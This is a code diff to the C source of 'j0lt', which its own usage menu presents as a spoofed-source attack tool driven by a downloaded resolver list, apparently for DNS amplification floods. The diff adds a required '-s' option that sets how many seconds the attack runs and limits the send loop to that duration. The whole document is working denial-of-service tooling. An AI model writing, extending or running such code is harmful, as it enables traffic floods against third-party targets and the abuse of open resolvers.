@@ -50,6 +50,7 @@
 #include <spawn.h>
 #include <bits/types.h>
 #include <wait.h>
+#include <time.h>
 
 typedef struct __attribute__((packed, aligned(1))) {
         uint32_t sourceaddr;
@@ -159,7 +160,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     MAX_LINE_SZ_J0LT 0x30
 
 char** environ;
-const char* g_args = "xdt:p:m:r:";
+const char* g_args = "xdt:p:m:r:s:";
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
@@ -170,7 +171,7 @@ char* g_wget[] = {
 const char* g_menu = {
         "  PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE \n"
         " =========================================================\n"
-        " Usage: sudo ./j0lt -t -p -m [OPTION]...                  \n"
+        " Usage: sudo ./j0lt -t -p -m -s [OPTION]...               \n"
         " -t <target>                      : target IPv4 (spoof)   \n"
         " -p <port>                        : target port           \n"
         " -m <magnitude>                   : magnitude of attack   \n"
@@ -178,10 +179,14 @@ const char* g_menu = {
         " -d [debug]                       : offline debug mode    \n"
         " -r [resolv]<path>                : will not download list\n"
         "                                  : provide absolute path \n"
+	" -s <attack_seconds>              : (custom) duration     \n"
+	"                                  : in seconds            \n"
         " =========================================================\n"
         " sc1entist spl0its-r-us                                   \n"
 };
 
+clock_t
+clock_ms();
 bool
 read_file_into_mem(const char* filename, void** data_out, size_t* size_out);
 size_t
@@ -218,6 +223,7 @@ main(int argc, char** argv)
         size_t szresolvlist, szpayload, szpewpew;
         uint32_t spoofip, resolvip;
         uint16_t spoofport, magnitude;
+	uint32_t attack_seconds;
         pid_t child_pid;
         sigset_t mask;
         posix_spawnattr_t attr;
@@ -228,7 +234,7 @@ main(int argc, char** argv)
         printf("%s", g_menu);
 
         filereadmode = debugmode = hexmode = false;
-        magnitude = spoofport = spoofip = 0;
+        magnitude = spoofport = spoofip = attack_seconds = 0;
         opt = getopt(argc, argv, g_args);
         do {
                 switch (opt) {
@@ -252,7 +258,6 @@ main(int argc, char** argv)
                                 err_exit("* magnituted invalid");
                         break;
                 case 'r':
-                        
                         while (*optarg == ' ')
                                 optarg++;
                         filereadmode = true;
@@ -268,14 +273,20 @@ main(int argc, char** argv)
                 case 'd':
                         debugmode = true;
                         break;
+		case 's':
+		        errno = 0;
+                        attack_seconds = (uint32_t)strtol(optarg, &endptr, 0);
+                        if (errno != 0 || endptr == optarg || *endptr != '\0')
+                                err_exit("* attack seconds invalid");
+                        break;
                 case -1:
                 default: /* '?' */
-                        err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
+                        err_exit("Usage: ./j0lt -t target -p port -m magnitude -s attack_seconds [OPTION]...\n");
                 }
         } while ((opt = getopt(argc, argv, g_args)) != -1);
 
-        if (magnitude == 0 || spoofport == 0 || spoofip == 0)
-                err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
+        if (magnitude == 0 || spoofport == 0 || spoofip == 0 || attack_seconds == 0)
+                err_exit("Usage: ./j0lt -t target -p port -m magnitude -s attack_seconds [OPTION]...\n");
 
         attrp = NULL;
         file_actionsp = NULL;
@@ -325,7 +336,9 @@ main(int argc, char** argv)
                 printf("- resolv list removed from %s\n", pathptr);
         }
 
-        while (magnitude >= 1) {
+        clock_t end_attack_miliseconds =
+	        (clock_ms() + attack_seconds * 1000);
+        while (magnitude >= 1 && clock_ms() <= end_attack_miliseconds) {
                 nread = 0;
                 resolvptr = (char*)resolvlist;
                 printf("+ current attack magnitude %d \n", magnitude);
@@ -353,6 +366,13 @@ main(int argc, char** argv)
 
         free(resolvlist);
         return 0;
+}
+
+
+clock_t
+clock_ms()
+{
+        return ((double)clock()) / CLOCKS_PER_SEC * 1000;
 }
 
 
